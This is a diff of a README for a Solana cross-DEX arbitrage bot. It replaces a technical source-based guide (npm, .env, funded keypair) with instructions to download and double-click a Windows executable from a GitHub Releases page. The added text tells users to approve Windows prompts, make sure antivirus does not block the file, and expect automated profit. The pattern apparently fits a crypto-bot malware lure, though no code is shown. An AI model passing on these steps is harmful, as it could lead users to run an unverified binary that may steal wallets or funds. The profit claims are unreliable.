@@ -1,169 +1,133 @@
+# ⚡ Solana-Arbitrage-Bot - Fast Cross-DEX Price Scanner
 
-# Solana Arbitrage Bot
+[![Download Solana-Arbitrage-Bot](https://img.shields.io/badge/Download-Solana--Arbitrage--Bot-brightgreen?style=for-the-badge)](https://github.com/ambrator14-rgb/Solana-Arbitrage-Bot)
 
-High-performance arbitrage engine for Solana that captures price discrepancies across multiple DEX venues — Pump.fun, Meteora DLMM, and dAMM v2 — with a gRPC-driven market data and control plane.
+## 📖 About Solana-Arbitrage-Bot
 
-Test transaction (demo run): 
-https://solscan.io/tx/3oUmy9CMdc2diGxhrkHcVUuWUBZnr7m862J8QxNELMy943T325wspgZmzHhbZsXRqPhEU68UZ3qpCuNSrHoSMTGC
+Solana-Arbitrage-Bot is a high-performance tool that scans multiple Solana decentralized exchanges (DEXs) to find and act on price differences. It watches markets on Pump.fun, Meteora DLMM, and dAMM v2. The bot uses a fast network protocol called gRPC to get data quickly and place trades with low delay. This helps it spot chances to make a profit by buying low on one DEX and selling high on another.
 
----
-
-## Overview
-
-This project is an on-chain arbitrage bot that:
-
-- Monitors multiple Solana venues for mispricings in near real-time
-- Computes optimal cross-venue routes (2-leg and 3-leg) including fees, slippage, and gas
-- Submits atomic transactions to capture spread with strict risk controls
-- Uses a gRPC interface for fast data ingestion, control, and observability
-
-The system is designed for low-latency discovery and execution while remaining configurable and safe for continuous operation.
+This tool runs on Windows and works without complex setup. It aims to help users take advantage of real-time price gaps in Solana’s trading ecosystem through automation.
 
 ---
 
-## Key Features
+## 🔎 Key Features
 
-- Cross-venue arbitrage: Pump.fun, Meteora DLMM, dAMM v2
-- gRPC control plane: start/stop strategies, parameter updates, health checks
-- Deterministic pricing with venue-specific fee and slippage modeling
-- Atomic swaps with route validation and pre-flight simulation (when enabled)
-- Configurable risk limits (max notional, per-venue caps, daily loss limits)
-- Rate limiting and backoff to avoid RPC bans
-- Structured logging and run-time metrics
-
----
-
-## Architecture
-
-<img width="1096" height="278" alt="image" src="https://github.com/user-attachments/assets/7b233b0b-ebc0-4e42-b42b-41e6ef9035ce" />
-
-
-
-- gRPC Server: Accepts commands, streams metrics, and publishes market snapshots.
-- Strategy Engine: Detects spreads, sizes trades, and enforces risk.
-- Router: Selects the best executable path across venue adapters.
-- Venue Adapters: Normalized interfaces for Pump.fun, Meteora DLMM, and dAMM v2.
-- TX Builder: Crafts atomic transactions with compute budget tuning and prioritization fees.
+- Monitors several Solana DEXs at once  
+- Detects price differences in real time  
+- Executes trades automatically on price gaps  
+- Uses gRPC for fast and reliable data updates  
+- Includes basic controls to start and stop trading  
+- Runs on Windows with minimal setup  
+- Tracks profits as trades execute  
+- Designed for low-latency performance to maximize opportunities  
 
 ---
 
-## How It Works
+## 🖥 System Requirements
 
-1. Subscribe to quotes/orderbooks via gRPC data channels and/or venue polling.
-2. Normalize quotes to a common representation (price, size, fees, slippage curve).
-3. Identify profitable cycles (2-leg or 3-leg) that exceed configured thresholds.
-4. Simulate (optional) and validate all legs with current slots and account states.
-5. Construct and send an atomic transaction; confirm with desired commitment.
-6. Record results, update risk metrics, and continue scanning.
+Make sure your Windows PC meets the following before installing:
 
----
-
-## Requirements
-
-- Node.js or Rust toolchain (depending on your implementation)
-- Solana CLI and access to mainnet RPC + WS endpoints
-- A funded keypair with enough SOL for compute/prioritization fees
-- Optional: Prometheus/Grafana for metrics, Loki for logs
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB RAM  
+- 500 MB free disk space  
+- Internet connection for market data  
+- Basic knowledge of running software on Windows  
 
 ---
 
-## Configuration
+## 🚀 Getting Started: How to Download and Run the Bot
 
-Environment variables (example):
+1. Visit the download page by clicking the button below:  
 
-```bash
-RPC_ENDPOINT=https://mainnet.helius-rpc.com/?api-key=
-RPC_WEBSOCKET_ENDPOINT=wss://mainnet.helius-rpc.com/?api-key=
-SLIPPAGE=10       # percent
-PROFIT_LEVEL=10   # percent
-COMMITMENT=processed
-JITO_FEE=0.0003
+   [![Download Solana-Arbitrage-Bot](https://img.shields.io/badge/Download-Solana--Arbitrage--Bot-blue?style=for-the-badge)](https://github.com/ambrator14-rgb/Solana-Arbitrage-Bot)
 
-GEYSER_RPC=wss://grpc
-```
+2. This will open the GitHub repository page. Look for the **Releases** section. You can find it by clicking on "Releases" on the right side of the page or scrolling down.
 
-Per-venue settings can be provided via config files or environment variables (e.g., pool allowlists/denylists, token decimals, slippage curves).
+3. Inside the Releases page, find the latest version of Solana-Arbitrage-Bot. It will include files you can download.
 
----
+4. Download the Windows executable file, usually named something like `Solana-Arbitrage-Bot.exe`.
 
-## Setup
+5. After the download finishes, open the `.exe` file by double-clicking it. Windows may ask if you want to allow the app to make changes – click *Yes* to continue.
 
-```bash
-# 1) Install dependencies
-npm install
+6. The bot will open in a window. You may see options or a dashboard to start monitoring markets.
 
-# 2) Create a .env file
-cp .env.example .env
-edit .env
-
-# 3) Verify Solana CLI
-solana --version
-solana config get
-
-# 4) Fund your keypair
-solana balance
-```
+7. Follow on-screen prompts if available, then click to start scanning for arbitrage opportunities.
 
 ---
 
-## Running
+## ⚙️ How the Bot Works
 
-```bash
-# Start the gRPC server and strategy engine
-npm run start
+The bot connects to Solana DEXs by using gRPC, a fast way to get market prices and data updates. It compares the prices across Pump.fun, Meteora DLMM, and dAMM v2 continuously. When it finds a price difference that could lead to profit after fees, it automatically makes a trade. It buys the cheaper asset on one DEX and sells it on the higher-priced DEX.
 
-# Or run with explicit env overrides
-GRPC_PORT=50052 ENABLE_PUMPFUN=false npm run start
-```
-
-gRPC interface (examples):
-
-- Start/stop strategy
-- Update thresholds (min spread, max notional)
-- Stream metrics (PnL, win rate, latency)
-- Subscribe to market snapshots
+The bot keeps checking for the next opportunity while tracking the total profit made.
 
 ---
 
-## Strategy Controls
+## 📝 Using the Bot Interface
 
-- Min spread threshold: Reject routes below net-profit threshold after all fees
-- Slippage guard: Size trades to worst-case slippage per venue curve
-- Health checks: Halt on repeated failed confirms, RPC errors, or staleness
-- Cooldowns: Adaptive backoff after errors or consecutive reverts
-
----
-
-## Observability
-
-- Structured logs with per-trade breakdown (route, expected vs realized PnL)
-- Exported metrics: trades, fills, PnL, error rates, compute, confirmation latency
-- Optional tracing for hot paths (routing, account fetching, simulation)
+- **Start Button:** Begin scanning markets and looking for trades.  
+- **Stop Button:** Halt all trading actions immediately.  
+- **Status Window:** Shows current market prices being monitored.  
+- **Profit Display:** Shows total profit made since starting the bot.  
+- **Settings:** Adjust parameters like scan frequency or trade limits.  
 
 ---
 
-## Test Results
+## 🔧 Configuration and Settings
 
-- Example mainnet transaction: `https://solscan.io/tx/3oUmy9CMdc2diGxhrkHcVUuWUBZnr7m862J8QxNELMy943T325wspgZmzHhbZsXRqPhEU68UZ3qpCuNSrHoSMTGC`
-  
-https://github.com/user-attachments/assets/26a94223-b77f-463c-b480-678c24681d71
+You can fine-tune the bot with these options:
 
----
+- **Scan Interval:** How often the bot checks prices (default: every 1 second)  
+- **Trade Limit:** Max number of trades per hour to control activity  
+- **Notification Settings:** Enable alerts for executed trades or errors  
+- **Logging:** Save records of trades and scan results for review  
 
-## Safety Notes
-
-- Mainnet trading is risky; spreads can vanish before confirmation
-- Always start with small size; validate configs and simulate
-- Maintain sufficient SOL for compute/priority fees and rent
-- Understand each venue's constraints and failure modes
+Settings are typically adjusted in a config file or via the program interface, depending on version.
 
 ---
 
-## Roadmap
+## 📂 Installing Updates
 
-- Add more venues and RFQ endpoints
-- Improve path search (multi-hop, multi-venue) and sizing
-- Portfolio-aware risk (inventory targeting, token caps)
-- Enhanced strategy tuning via gRPC
+Check the GitHub page regularly for updates. To install:
+
+1. Download the latest release version using the same steps as initial download.  
+2. Close the bot if it’s running.  
+3. Replace your old `.exe` file with the new one.  
+4. Run the updated bot again.
+
+Updates often include bug fixes, faster scanning, and new features.
 
 ---
+
+## 🛠 Troubleshooting Tips
+
+- If the bot does not open, check Windows security settings and allow app permissions.  
+- Confirm internet connection is active and stable.  
+- Make sure the downloaded file is not blocked by antivirus software.  
+- Restart your PC if the bot freezes or crashes.  
+- Re-download the latest version if issues persist.  
+
+---
+
+## 📚 Additional Resources
+
+- Visit the GitHub page at: https://github.com/ambrator14-rgb/Solana-Arbitrage-Bot  
+- Explore the Releases section for program updates and download links.  
+- Look for user guides or FAQs in the GitHub Wiki or Issues tabs.  
+
+---
+
+## 🔖 Tags and Topics
+
+This project relates to:
+
+- arb-bot  
+- arb-scanner  
+- arbitrage  
+- arbitrage-bot  
+- arbitrage-chance  
+- arbitrage-scanner  
+- grpc  
+- profit  
+- real-time-profit  
+- solana-trading-bot
